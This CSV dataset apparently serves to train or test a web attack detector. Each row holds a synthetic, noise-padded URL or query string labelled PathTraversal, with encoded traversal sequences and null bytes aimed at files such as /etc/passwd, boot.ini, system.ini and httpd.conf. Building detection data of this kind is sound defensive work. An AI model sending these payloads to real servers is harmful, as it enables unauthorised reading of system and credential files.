id,class,vector
4226,PathTraversal,/c6/jaaeldn2qaoavmvrnh/50wN4lmY63replacerHgI/LMhnMh_ev/EtA1EpP/xD7yeT7vWGE/wvsodT.asmx?n4n6esRtm05=nV5_CpG82yp&tHo=oerDqthitjwpeeih&binXn-zOK2=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion&amcxugeof=tLVLsYyQoRcc&tnenhcllsleeVn=2457166&oiggndeoaa=7+ohth%7Efttejdyd&ehnfiiateoin6k=T&VbDVi8DP=nA6obeioawtHcir1
4232,PathTraversal,/K9Tl1GzuZkTE5P/wOn/nh3oqpa/sm8eX2/HN4FGnQa6QqaN.mdb?TliEc4vd=..%2F..%2FUBData%2FMembers%2Fmembers.grp%2500
4233,PathTraversal,/T0ehEixOoYHrNhtl/nxatoacp9Dg/obusufwarosdtmils/sWzut25Vu/nN-9yY1SseDwyIZeY/ipt585FA2mdgd/w9T-qKPecWY1Exj@MlH/oogeiptbwhae/tKz/i5TeS7l6B7nMhZ.d6Xo/sPvSIFt2r644/Shr7a4e9l.bin?
4234,PathTraversal,/nkxqzHqx/6S0jiQ8@kl/2reAdctNYN/a3E80/lxcbiiGC/eEZvN_MNgFMqix/p4cdnuu3Ucod/ih0N.jsp?kehrL0UqCA=en%3A5&nvtloin=2o3ut&5n6roR=6&tr3yraptcJE=dR-9fdM4o8s&ortelaa9wdeP4e=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html
4242,PathTraversal,/at1ITubo8OZ1rtoC.d/eaS5-rbcuXpMmbo/ih/stdinuJEu0F/LrcpcatO/N42o9ulsEepaoKoeh/tVMNZeSC.zrZl-1yvd/lhanelseeAkabsrBSlai/i-o-rFMQ0/ryvLx/iIdND/qgHeubeD.msf?7t7alo=iframeJeer%2Baoz%3D%292ua&Eoajtgevhbi=le9&htpass_3zbndroph6wiw=e33AFgQ&irt8n=7026776&bi6NlgnhyAhnwEr=736209032&Nrptn=315599&nhoslhxl=3338341896
4244,PathTraversal,.////////////////////////?
4261,PathTraversal,/cr/eHjweu5H6/vHvarJwAQwFH3.php?eEAuTjact6=97491833&Cmhie9N=collection%28+++++file%3A%2F%2F%2Fc%3A%2FUhrDt%2FBa8hr.xml+%29
4262,PathTraversal,tlkie4atm6trrtI=1034&ipAHnigfy=../../../../../../../../../WINNT/autoexec.bat&Aosaaatlontb0=xrnyetcaf<se634s s
4273,PathTraversal,/fromSchildpZ5NoYFN/ao4bueeinsiq8slem/iRehrjhsmmhun/htie7/hneiraol5p5thi6nbnA/l4ZX/InstteeqDu1KbssegDWe/28/mh/n19KVmIcgdWy.cgi?ean=deiror%40e%5C%24qidlS&eea4mstcis=%40%3Fnbg%26zmhrpx1connectv&eombjt7h=heuh4Dez&jyfRvaceeE=..%5C..%5C..%5C..%5CWINNT%5Csystem.ini
4278,PathTraversal,/yMT.7_.j2nEL.tiff?sepmedni1ax7r3=pserE&6rLemtwoSF=%2Fetc%2Fpasswd&rtytytsirlyeEs=eir%2BGscript&eatrsdler=ib0&lpCeuemuo0m=tu%28k
4287,PathTraversal,/t5Fnt.ZTG2/TUHX4YdsRMdropnnb.tiff?17esse8aab=%28&hnlohq6qwdoeTm=aixee&aaorr85ihg=hs&TTINbcgz=NrshmbG%26un+ase
4312,PathTraversal,/nWVbnk.-7u-jjJz/nkv6qzG-UY1L/toHrpoiotne/p_/myWG-yw7fzzfjULbDb.m/eet8/wihoYibmhtt1ogygsl/eyvaTeia/kwaEhmS6JmPg3/3enodeSqcmd0.group
4328,PathTraversal,UkPh= eval'5replaceore@e0/&mtN=477391&7tgsO=passthrucso
4329,PathTraversal,/Ft/uxGZ3LID3aF.y/tZ3yl1P12/ettitalTaPsnp/YhqAFhYQselectT.exe?Gnfy=i%3A%5Cwindows%5Cboot.ini&urdadpgPknEFe=%3C6ons3drhs+ew&esivapr=773&a9dzbGy=057
4332,PathTraversal,/03uTvBXKsystem/fhwRQ.jpeg?eho=6693593&ieate95otHatur=..%2F..%2F..%2Fusr%2Fdsqqdsqsd.xml
4335,PathTraversal,artczb=..........................WINNTsystem.ini&ht9eot=kSCVk.&retseoeoheia2=9698&Tvv=45&hrffu=479
4344,PathTraversal,/../../?
4349,PathTraversal,tmpn0Y1-2ibin=+sk?dlchilduetcjg&rpo1tosjdhu9=678678&mur=7116&HN.87h.QO=43556052&oea=aryks&l0bdg=2598756&Eiw=atmpmaa l$i&LyiltniYq=th71ha&8apb9rh=evsaeg3e8herirhCr&oej8d=l)<elsnas-zmYi&6xml0mtF=0aao&asbs8ptozwf=634&rs=846689452&fnwee=ael%Ro1 o&mh9niiostt8tuo=89
4351,PathTraversal,/@childJHBEA35ExXd/AhcoaAlp61lhnasBsyo0/hhsoEtoaseroweOnTau/l7shd/u7oDkvYKSqY.k0r/yzvgK/vO9E3IgqLZdbISD.jpg?zd=9951&vtehdaa=zstylepsbvaagiwindow.openrdocument+e%2B+-&lfgp=s5n&neez1O=8G7&KA6MWVl0=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fchal%2Fvestns%2Frail%2Froatlegend.sh&CHziframeshutdown5.@3K=no%3Dt&nl=e%3FE&rGdvD=nyupse
4352,PathTraversal,aegj=access_log]iza&sediodrean=68885&hpity=uNmie&ito5itn=ltoe56Ean&OJmyb=j?9sw
4368,PathTraversal,/Sk@5TsED/PLMetcqPH.gif?
4372,PathTraversal,/oAizP3/FdwqWqSUj/e_sx8CTNp4bLw/g2@V7@Y/QK./oPcoqdapealeuEm9s90/ouDBAJNU07ABj@oAMW.mspx?.3fromJ=0949&atnaIter=+e&y.huA.=replace+8g&eErehrya=k+2ia&Leval5nluXmail64-Z=8521228161&njrocYhira=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion&sd=ter
4380,PathTraversal,/uEuSgzo0tyvN/5fboot.iniUVw26_7gPTm/w_nN.BtWAy7/h6hstseon/aIijqv/asoe4mpjr/is0jh7ipeNksow.mspx?HtHshH0eMln=676&cEHux=vwHf_kJhefPq&steO=ee+varo&objectdocumentOd1KJ=rgehU&envrsemneU=0625&gsipei3mia=%2F%2C%2C%2C%2Fenrg%2Fewis%2Fpasswd&ygnaao23ay=cU2nDHsMu-k8&3hildtomr0ano=aOeL1ksj&aa6htiq4ryraae=tandebllechoHss&6llyh50tnerop=n26J.pFq&ZmBo.=lV8AFi2CQ&l3=n+e7m%3Cgaw%28tevse
4388,PathTraversal,/servicesa/4iIMuYqoBwG2NrN-h/lCrv/PQ3cby.QO_/rumaAolehrwylizswe/l.DVSSSaSx2C_7jcwb/tGrUX0aAiX/bodyLRvUk/tr1UUJGplVa/ZVX1Fj74e.html?e5bomocn4a=TEp&yPsystemwpx=3s9aunwei7o&sga=-&JqSV=doc%28file%3A%2F%2F%2Fc%3A%2Fhewh%2Fsgcq.xml+++++%29&e7to=rCA&tacG=0iq&iCdolium=ocx%29o&2t9gIhhnre=4&oaus=190002
4390,PathTraversal,/m7I/elttN6t/c-Rm5kOryx/e7snvdmms/h4qUFLlAHiIbI8srO@Qh/ahstkku6iutbLuednceY/ecHM1O-@DFV/atpsnieo2l8vdciyw/pth9Okfnahiuw/cstnssragiethw28pwds/yfalDnbnte/phpGNIautoexecPgboeg.png?3gtnee2r=67694&lk0=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fyo.bat&dtoeeeoddszhtz=aoa&ned=4
4391,PathTraversal,/e49VQYCJIWiy.zZI/twisohclarzLsu/sQw6kuznXlohHredez/hath4lorrerlnps/Y9DMjsdLff3b/aKbllvM4GP/9YL_dnuqo/i53YOFug6/dtfZnudjohHs.jsp?osd3tevc8=9505&hheuqmloGl6bis=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2FshOod.conf&rerhihte=8996071&tNneataee3=Bjme&rftrhalspie=fW_&egeenxeEh2en=do5sA
4400,PathTraversal,eented=hm?uhr5nd3j&eeZnnei=7nqK@&trieeaemaegtc=640&XKwgetp6=6465&snd=7041449&t7ist0tosiech=wnedeih0o&inZtrsf6atxasi=2nr0lv&qAehwethf=hJsfR3cnj1pE&nhyr=4978188&yteniecsorsewn=2sWdwrci0&oHecaeEehsv=rKIjk8MEMy&e4t2gE=57129&ns3Tstsrndrp=lopV1u biAD]&Indiereainqar5=Elue&ss6=517948
4409,PathTraversal,/rltTn9jtea/a5mKs@@Jl7JFo/aKtTRGdnw/rCnuD-mVj0Qd/ofTy/akkh8kzZ236t/e7.css?267tbdnilonae=Wt%3Cchild&o0ieoltnMe=237671&t_FD-qWH2suprocessing-instruction=0482&Xuwgpv=27&7SalZ=292897&yeea7i3eiNeao=6d&5kaiCn4dgenf=doc%28++file%3A%2F%2F%2Fc%3A%2FtInx%2Feodci.xml+%29&jtlatn=88417195&yoBAaunto=rjetb%3Ajb%2Bnetcatoy&fwsd9Hmt=3&isrWmcwi=osEauuiau&nai=%5Croleroe+163s5%3DoAcmdk&tjlenhozFgbEnwr=50739
4414,PathTraversal,/rgTI6/oT_tC/wnlStcan/Ch.GvAo@y89V/pL64/nr2D0Gv@j6X.htm?aeelotaitqnnhid=74604980&ies=be&vtO1=objectwncDposition%3Ca&uhNnzdsrnxe=ead&Hme=nwptd&shtrltcpldfi=Easy9o%29thl&jodfno9=azorlrnmerjt&aq-TorT06X2meta=uiMeDoD4f1&RTW@5_x8CVJ=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html
4416,PathTraversal,rg3pahcliirZ=node8ansarwsnhps&RQ3d8=7128582&_drop6knode5C8=ue5Tt018orercxres&nuaarmer1ymlr3r= &ea6aeahhMi9pz4a=q/2o;&pt=../../../../var/log/access_log%00.html&x2gadrntdlvH=30&w9muoethqudnxh=nhs&f8=rRerytrhfveO&tctebe51seH=ulyo2swaii&sEat=orNed&ds@0G3wv88Yq=e2@Tkuk&oeg9=042902
4419,PathTraversal,/kWT--pY3/fBDX52w9B_ARl-/lz.html?n3fcsraboffo2l=rh%3C&a68=uUjCTXR3b6P&ii=L%27%3C&_m1HNv=515&aoOuhgejNrli=07675&n3hgXYunionr_=slhifoaotnP&9rt-PmobjectZs=lMK7&or5Do2h=2879&e6eaate=rqtAspobeoros7asad&zDS=%2Fetc%2Fhttpd%2Fhttpd.conf&rof=893221251&hW8oocuraireo=83642&rprcrErsteymia=oQKoDq9&eir2qdananxl6ao=h&hSei=r6j_N02a73J9
4426,PathTraversal,/5ieeAeni4C/s63ZNH35dCj/nLy899n/nQxwZGFaKFt/sJFgOWYmBQt6/wrheNrrlgnmtvo/1y3rcpwinnt6C57dVGR.jsp?rtnas=t&M9XO8replaceQpSR=faxoenrIldaefi&dsirofteXar=g&Fvxt-tstdinOM=aerul&c2nhseo=%2Bt&ddp=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fma%2Felorllie%2Fic%2Flatensll.pl&z@.KRI-=unh&gls3atuaifDeNa=56&nodeA9Qv4L=etosfg%3Djtg+ade&azsa=ec&ht=waT%7CmetadnnloaaRod&ZhjoqnahS=ai1jgiesr&@access_logrHuAnetcatI9=lmsZe3etDeiKa&eusfAE5m=rTgNGj5pio8f
4429,PathTraversal,6o0o=cFI&in5aAcgst6uywC=tChV&1lu=..\..\..\..\..\..\..\..\..\WINDOWS\system.ini&odt=352&iutbRouo=6I9.ZpJV3&ftpacceptoOoptlIFA0=ar3x&r1keamo=67359&utdacapi=9750094&c5on1Bb8ari5gia=1rre:tnwCrfoh&Mg1pC=ooel$t/urZeedey&ch=ralaxyalihcd
4434,PathTraversal,/tr39.htm?thh52htrutc=3&input40_1XoJtccV=dohJ&0@Eu@z2w5x1=%5CWINNT%5Csystem.ini&ehpXod=exTsrlebs&attdseOFcbyit=76826&RetIYhWC=X&ode=19450&eAod5s=e9eeritcnVRege%25u12dye&otd=itaslibrciselectE1%5C6&nCF7VcatwHRzpi=scohnssCqhimtZ&edrAuedSythl=a%3Bye&MQZjPGtLvariBR=80796&Ha=336605758&Ieoectsbn=eeH&th=n
4436,PathTraversal,ot=nxTt3@V&70etenaem3=ovi eaccess_logcetd2tB-Ino&0sqgyltybern=@mt&i9ecco0vrgmtStS=215627&efoneort=eei$o&iliIsacitrbe8EN=32670
4453,PathTraversal,/otqtef4naooeCtn0toh/92WLwP/epkBxk/7-5cv_4SJX/vzQmLNaohYaBcb3.gif?pFriSieO4asirh=t%3A%5Cautoexec.bat&idawnRaeh1m=63175557&swo=9719&tbuiihPeii=documentaTi0eIto&BconnectUX3cNYVo=l%5CreS&iiaebbtXanit=19586&fSaOprdibniwqk=egae8ekxtsol
4454,PathTraversal,/gtcxaS/drc8li/cvbNoRVW6c/naIDXVO4iSHY/6oiirohtsee/oeaoovTo.jpeg?8L.O9-L=doc%28+file%3A%2F%2F%2Fc%3A%2FocAy7%2Fue3ezofz.xml+%29&jOupDchildLXK=sthitdo4OcbsuaniX&oeetw=fQetc&staeudla3soenua=mto
4461,PathTraversal,/eT3n/o7yn/lVOj/amLpldhetinSysenb/5Raed/xD1oKNn3jHX7o/6LaT_0wFAa1X.jpeg?n3l2=5430&ohdhhiEsiG=e%3A%5Cwindows%5Cboot.ini
4462,PathTraversal,/eAOtenps/Dem2e/Aaccess_logtE0dyDCg56FQy/nj@mL1/gcat2t3YPnRjadmin/0UEONX@BjF2AQhv/znpksahsaorirnFae.mspx?cLya=080016&bgsound55nvs7S0tuV=hwI_Wa&fiwvxAkewe=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&sk=92985&b9ahqMUKtUP=eiLfZzEX%40k%40&ykes3Sei2ee=Jie+%24d%29&hhnfauom=lE
4479,PathTraversal,/Nmwsjel6/ujt@k194j6n.pl?KVBc6etcDce6F=ebg%40Z5nef3&poe=gn&nuVee=3150&owl=s%3A%5Cautoexec.bat&2u=%40eu&sT0whi=99&ngf=qmJ-boBIj&Na2phlhlfsaho4=nth3&rt7opb=eImhvEt&LLhaving8jWBS=068&iuiAfu9t=083&-3wFretc=tovahR1
4480,PathTraversal,/sia1nWhfodtinhww/ehecei/8exeas3teTicohDvt/dmiaaguuswa/h6_t/de7dnrue/sUDfP/trt370odbCthgoievo/tlduanlei/lraosoen9ihlteOieew/ilK_F5S.agsm7.exe?fmimgwf3Op=%5CWINDOWS%5Csystem.ini&nfOhaiwmny=cl%3Al+hinsertm%7EI+4H
4481,PathTraversal,/4i4boot.ini7D5KincludeysIAstdin/l@yYxYI/oPotVTFh4B6kzpt/nF38.YnEOO/.Sz@access_logOOnYujpAO/sRhwOg5uE2t.N-RFrxp.cgi?AGcZ5CUservicest4=91674&4gshy=57&vlrrtdnu=tfn+accno%7Cevali-nsd&G6_OEUV=efoOF-r9GmM&RQdRrg6b=hSy1%2FH9Hthttp&GGsock_streamg9g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&8C70s5T1=reanm+rcws4urw&7ntirewonssette=tAo%3Fmixml7cn+a%27%5Btdim8o&harwbOW2=h
4485,PathTraversal,/vVwgetps@mJPrmocha0cn/5BX5Z@-.aspx?bolai=67&s0wU=wo40lrenprst&9me=6480&Pmr9yohbkh=h+I-++eouy&tn=e4ir&dfrdMq=pra6i
4488,PathTraversal,/uqsZ/u2sXJ3I/ddoeramgtjtDn1sEee/hkG97250o@D3uM5SmP/fj70fDyfpW94Kw/_-mps.gEservices/EFxzWpNvIQ5location7dD.jpeg?adtodrpMdisdsc=7&Heosl=%5CWINNT%5Csystem.ini&orinOollan=118
4490,PathTraversal,dk=d2TKT&lnttiY=l&amc6ea=\tt;HhhunionUnc&Ras=3761&iesm=4&ims=../../../../../../../../../WINNT/autoexec.bat&Iez=e idevalFt+auTz&ihdmfyr=ngroup bycEns e<3elg/nsde&tolvhal3a=[ao
4492,PathTraversal,.////////////////////////?
4508,PathTraversal,2htYimdjooii=07196766&ilikeh=38342&loteytji8en=Ie1tshdvoaha&6n=ixuq9Bt&ropbtnu9aa=e8t@&Eardeejecelhi=9210&6ome=etoedi55o&xeaundafesci8kg=7fDZm4l&ketiirse=3&4lmslhanbq=37547&yws=oo6lnhoSUa1uses&fmri4dsqce=t<
4510,PathTraversal,/tbodNteA/l2sriuw.sh?oalae0et6sif=form&Rf0from%u7F=i65kCM&rdzoezn3kfGRw=39982279&nintIer=hejd&eedin=iVe0P-4GZ&iisN=tP5&arnheduCrjs6=4628185&lautoexec3EUv4SG=..%2F..%2F..%2Ftoan%2Fadmin.txt&oeaineidedcah=i8RqU-gU&rF-J0=603&fSietytdZc=tmp++Wu&iE60j.9=19
4517,PathTraversal,/OeInOda0dcOrl8dads/e8ieloytoonla5/sip/gClAv/D7jK.0_R5nccqc/a./mB7/ab58/tet1pnu6tsuom/432P/5d/nlittnaao4shutewt4.js?heerjnrrasseqt=04&fSDsEFU6Ibgsound=h1t&YNEhlrd18dedtje=rsa1nlekT&hol=..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&IoDsr=84955&yd13at3mi0YLnmH=6790&ogRayttsr=nerbheoo&qiy4aj44so55=e&hUbvyok=480&Einierotmr=lQFq6ogoU8&eS3wAislc6=nces1&pO-RekbunionYh=2x9ytjBxp_kjr
4518,PathTraversal,8yw4CDDt9g=5985&eriNrs=d.xkBv&enlst6eoohxh=rDSKyDSJcA&st0aitnExaa=;eigs&xtnotr=kzso8cotylbn&Lb6oqtxruselniT=Mil&oy=140140&ec=../../../../../../WINDOWS/autoexec.bat&ooogir=nlQCLu&irrst4tfn=01419&eiTcby=vempiecknsaizes&aikoetdewi=|11&ao4sfea=inVPVyb79&Ay2=855117
4529,PathTraversal,/ytnbp21oeNgerofESfsc/0@nH/0mengTyNEvij/aWotQ1EZ3TYE9iD.32i_/PtPeerbhsetsA/sWmefe8tStagedo/yieat9o/KMNS6/reszda5wnip.gif?emepnsc9tmnoo=oeO&btnHf=8915203&wbsastnsolue=r%3Dnfaoed3&olev6suesla6=ceSmoook&betweenGJExXdRwMP=0827123&ttctpoeamYttntd=hL7&noethTh=pxtermlsi+odia&mc=3erx+&iiaieR0Ererrrn=IuP
4530,PathTraversal,Czdngbh3ta245=01777&IAMnVlsC4nQ=i/delete&ga=4)=snwdupdatecaxka&-Brcp61=  s44&hoer=Amlnce]ifh&uanaiillnai=22&uzaythA=/etc/passwd&spcfn=clog% j&omzeheesig=~metanccs[wt%&uZ2pRp4A=76603&A8tgnHi=859&vnetja=nm&Oaccess_log8Bh2=9860&jinob=e&ptvsor6geuttn=66652
4533,PathTraversal,/objectFikElfWjKc/WYX.pl?dr=aptfrTIIi&ithnlou3=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini
4534,PathTraversal,scdi7sSE=E:sdeT0arwlikeftphpi?i7c&gs3pehiilgb=80727254&owwinntselect40dCFgjLlike=8245583&TGLUg4Cqhtacces4=esueSBlhcMr&ryTadminZJ_n=LadE&Lyppovnyecdc=tiarigt&ibStusr29n=eo&t0ugoItrt=hweo/3group bysa]EnE&easrh5idtRsSz8=nmRl&tvtlutoepner8l=3862892
4536,PathTraversal,/i0on4opS4rhitz9d/HwIWUtmpL3-Owinntq6/A1/w4vdkiutoolL1tsli/rilixmtjlae6fdc/onafnioAki64/ODD/hD_DDyrk09usCGt0qp/wVtINqeYL2_1kD78/bgpdi.exe?@PBZvh.E=q%3A%5Cwindows%5Cboot.ini
4537,PathTraversal,/escrayeJu/rLF8vymobn_/m7d6lApt6/tLPrA6ol/BxARj/oUu3qOzU/mZgYEnodePbr/hIJmJ.TgBR9GaOFq/sNe.php4?sRhsRdtbsE1=..%2F..%2F..%2Fanlari%2Fadmin.txt&nisqewoeerei=%402&jhygatrzlz0r=626748&ttraacErwet=%299opassthru&vTlreal=slS&6Tyxe4emxir=9ddvOkontiwo
4545,PathTraversal,secs=@http&wfwseEadhHnath=ohkQh&owefreeecoatlfa=bqOi_&ltrn8eenmoymuzi=634772&krh8riEht=erok&sai=\WINNT\system.ini&ecEbk3d=d9sD&pax=393526779&eeRte=wSht&3s26OtPhh=238&rHhr=097
4551,PathTraversal,/ncuaane/eif4RdhhkeZDGAoZtzX/eMknFWIWF/dropj/gbAs0/1PZ2D5access_log/aRDP_e/50tOdU.bV207is/FUnKTx-WumS.sh?tnnRojr=5370&geubzOniei78e3=oilaiE5Noore&nhyjdlNinbi8eio=e%3Ewsll%24ib&_wSoeval4=%2Fetc%2Fpasswd&d7ze7=nratt&gssterhacomTa=aenln4h+sL2f%7E+his&IzN5heetbe6H=ercpbiDmnilc1%5Deeosa&lnaweop=3RScl071msoofo&IrhnlDituansm=2documentwbt&esdatov4SlBro=alaaanulltAiscriptr&tytmefAmdir=mqoftJmiose0octgo&iztpewfwetTo=uIhq8ti7hsauoi5&V8L7WxLWpdkD=metabwdocumentpt
4552,PathTraversal,/eTi0oyoyle2pta5g/siodrrd2ds/doebOsnmv.gif?4T8w26E=eGani%26eueity3ard&ua5bZar5eoE6a2a=2zs%2BNc&EaseqooenxsaiAm=neehmmyeeatrxie6u&0IdRaicas=3673&letnsoe=187&HASwwK5y=4370139&adR=egqw&UucopycatyHC-tmpnJ=a4&sdintzWtkner=%2F%2C%2C%2C%2Fneut%2Fll%2Fpasswd
4554,PathTraversal,/bQRl9/srfTl5c1dnWq/olJ/3c8r4R/as06SJh-pb5dP7sZ4/flX0vhVTyV/Tl0dGnKwget_phpKautoexeciAj/eOtaswdmieBgiykGiir/beennyjswei/tmbHce3tuGlMDbR/ia8les3edc0i/tiIBrh.aspx?
4565,PathTraversal,/c9lnmststtarenDElei/n-zjzii8icAUnJAdql.jpeg?tstta2rnnnt=t&rgrea=09423220&nerh5ea=nYpa8sni&sebhacnde33e=1&lrcrsg=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion&TimYtDdaGhts=749&n7=eaeoeGitd&ylnnttgniorcl=ys6m
4566,PathTraversal,/s8B5C.jpg?tuasraRtnsreab=nhe&Vchotj=oiho+hIYad0sfzallgf9oi&2k@K=6591847421&tumthlSit=..........................WINNTsystem.ini&yeowfjer=5824541309
4572,PathTraversal,/3gqV4r@mq/o3a/lfFniOdsu2ebsn9/athamdGl6nY/ebH8OzlElkk9QOVtz-Zk/etEnjcxrBsxwumserdlh/dWH/u4l8KGlnI3.aspx?9h0fdonsipcvto=94054715&dOfkHbAO6WV=a%3A%5Cwindows%5Cboot.ini&s8cb=n%260metykCUc&niwetme=nPxRDHobTzP&eucdArnhyeyc=alwhfopSSustsdi&rapnc=61&dsyN=05573856&hG.B2XxXg=mbf
4585,PathTraversal,/hxqd75A@Gdii0ng/e6Yndtta/hrjNmeen4e.dll?3P2XV9=ehb12dii4sm&l0=..%2F..%2F..%2FWINNT%2Fautoexec.bat&aiumo6p8t0hMh5e=7309490067&kT@W=dema+i&swskah=Zlja1XtbGi&t2nea=hep&nsg=htpassBSa+e+ireecH
4586,PathTraversal,/aP0c0FrzIzSPbQ@oxyl/eo4.tiff?trlaeat=unionrtn&tesi4=u&moAe8isq=c1l&earfShlsok9=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&uih=7q-ah2tevafromh0d%2B&GW4uuQU=6&isedrrva8ttdto=m9aW&h7jpscript4V9location=mbtoARd&0nttr0cnah=641&nsxreA=cze5l40e&jtZ=lrn&wei7lgnhe=eservices&nreancubos=pasH%26o3ssbn5eKxno&t9r=ichild&l5unhcp=%3D6gwgett%5Dp
4590,PathTraversal,fjmupaARrc=coZA-13yOE_&2ssn0G=f8c&olp8lnr=Ri&pnaigaUsuec=83119&cktaeadesese7=%2e%2e.\%252f/\%252f/...\%252e..%2e&ohtOcsitd9n=aflopieaehy&SXeOqXVHMdds= ee6e&ooleOo=awindow.open&AnRpI=oenrt&formIKXO8=9&rcm=5525
4591,PathTraversal,/mdcs35ztoe/Otfa0ryoaa/nH7QxZSz3B.GvA0sKzYZ/4pU0DIs1D/3orwZ.swf?husU7dfa=055&e4=C5luoxtermoro&hl=S%25tmp3d&raJse9NTcq=50&t1=vetebis2eea&ny=28&nij=8164282632&odIsaio6ya0l=noV
4592,PathTraversal,/aj/X-R5xB940JOr/aM5PHY8xF@v_Lq9eqm/0xXvqKlAfy6P/omiehhosredlt.htm?apoowtee8torute=%2F%2C%2C%2C%2Fe5ba%2F4ne10s%2Fpasswd&pasitel=76rT4hlgt&Y2s9iekfyrt=%5CteiNinumunion3A%3BaOlq&2a8wt16l7tc=295912&dlewb=+tm&iwiOuw8Usnh=hfLXdlrse6mona+ee&.cBmochaQ6pYunion4GN=Oex%29&eNDlpjaddzeb=4069014962&naezqervsaw=emnhavingieUathbs&umes=l%40pHQ&dialticSitaiy=89384155&raoi2xPoadh=se6ti7txzz&yw=iamWrAEA&coaansirptdssi=eFeh
4609,PathTraversal,/d3pdADiGN5U_2i9TH/xnnfejnEeiys/as4w-CAGq/bn-47bWPhuG7wZuS/esiob6zciupenn9c/bgmOrb/caamaleisishljN/ri/yaOzhiaf3Uecqaxs/a_2zHDBCwf/hdrv3.shtml?wvprocessing-instructionxs=126&73BcZ1=416739908&cehojetum=tssejlesteodrppAj&oteaot=FeirStgnehwOu&Sida5eftEf=onph-&R8zis=.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F
4613,PathTraversal,/i8J6v/tmelurxfzeIosnnnfgi/eerwsIoyIePe3oo/k0bc/u32wwUAxN3um-jDhkTZ/t3pnp/httpsGSDSV5Ewuv1/wyhuya/_Jo6rexecDJ.sh?tt=526304&atdTrno14e0aA=2738615&NgKo9-1mMIftp=8694&qIAYa8TUx-=+w&lni7i3=emEndenfidem&tsbecey=75&iehdkobhdji=ieniucoooa&dlOasDeudcmma7=etg%3Aoee%2Fe&hamyy88hrbt=..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&ycodU=rsos%29ws&ctrsnwicit=99358008
4630,PathTraversal,AG4Bg7systemAjco=68003&T.270665QHSU=sselads9et7iioNp&7Mq02teenrOc=m2s&wrph9antTs=rPJE@xjO8B5&lbhb=ttpWtgekyea&naw1vto5j9tc5=2:\windows\boot.ini&dME6lerjnncth0a= etctR?&creT4ae=hmhiriiftmsnnrk&ihdkevHcb=lsblegegn&SaHNA=h4eSM&blameDleaegram=wboot.inim Iht2n &6iletTaueehsnEz=coted
4632,PathTraversal,/teR5kDRC5/tohSi/8adeiybh/twe/dDYpRz9E8xiiGCOff7Y/bYsi/M72c/rEduecl8o/82yenKVV/a7z/iaonsE3ttB/K-SLdM_U.gif?MorOuuerI=rlnoNunmjd%7Eee%2BEhwps&frcpUyAdO=ryMMLi&roouEseoetxoo=nrechodmiframe&JZdGlrn=hry%3BUaite&ntbitanstlvnt=zn6NdsucTel&iecagaolhtowet=srdu&udncnosibpns=dhoehYdRl+w&fett=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion&p211TnetcatLmT=84613479&eaes=8ek%3De
